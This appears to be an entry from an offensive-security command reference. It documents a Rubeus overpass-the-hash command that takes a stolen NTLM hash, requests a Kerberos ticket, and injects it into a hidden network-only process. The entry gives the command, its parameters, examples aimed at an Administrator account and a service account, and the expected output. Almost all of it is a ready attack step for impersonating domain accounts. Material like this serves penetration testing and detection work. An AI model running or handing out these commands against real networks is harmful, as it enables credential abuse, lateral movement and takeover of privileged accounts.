---
id: cfdb78a2-42b6-4e3e-8f2b-2df04ad55438
name: rubeus-asktgt-pass-ticket-to-sacrificial-process
type: command
executor: cmd
data: >-
  .\Rubeus.exe asktgt /user:$_USERNAME /rc4:$_NTLM_HASH
  /createnetonly:$_PROCESS_PATH
output: null
created_at: '2023-04-06T03:56:05.155235+00:00'
updated_at: '2023-04-10T20:26:24.177808+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - pass-the-hash
verified: true
validated: true
---

# rubeus-asktgt-pass-ticket-to-sacrificial-process

## Command

```cmd
.\Rubeus.exe asktgt /user:$_USERNAME /rc4:$_NTLM_HASH /createnetonly:$_PROCESS_PATH
```

## Description

This elevated command requests a TGT using the NTLM hash and creates a new hidden process (e.g., cmd.exe) with a network-only logon context (/createnetonly), injecting the ticket there. It isolates the impersonation for token theft or debugging without affecting the primary session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target domain username (e.g., Administrator) | Yes |
| /rc4:$_NTLM_HASH | NTLM hash in hex format | Yes |
| /createnetonly:$_PROCESS_PATH | Path to the sacrificial executable (e.g., C:\Windows\System32\cmd.exe) | Yes |
| /domain:$_DOMAIN | Optional: Specify domain | No |

## Examples

### Basic Usage

```cmd
.\Rubeus.exe asktgt /user:Administrator /rc4:$_NTLM_HASH /createnetonly:C:\Windows\System32\cmd.exe
```

### Advanced Usage

```cmd
.\Rubeus.exe asktgt /user:svc-account /rc4:$_NTLM_HASH /createnetonly:C:\Windows\System32\notepad.exe /domain:example.com
```

## Expected Output

On success:

```
[*] Action: Ask TGT
[+] Requesting TGT for user 'CORP\Administrator'...
[+] Received a valid TGT from the KDC
[+] Creating process with /createnetonly logon: C:\Windows\System32\cmd.exe
[+] Process created with PID: 1234
[+] Action success!
```

The process runs hidden; use `tasklist /svc` to confirm. Access denied if not elevated.

## Related

- [[procedures/OverPass-the-Hash-with-Rubeus]]
- [[tools/Rubeus]]
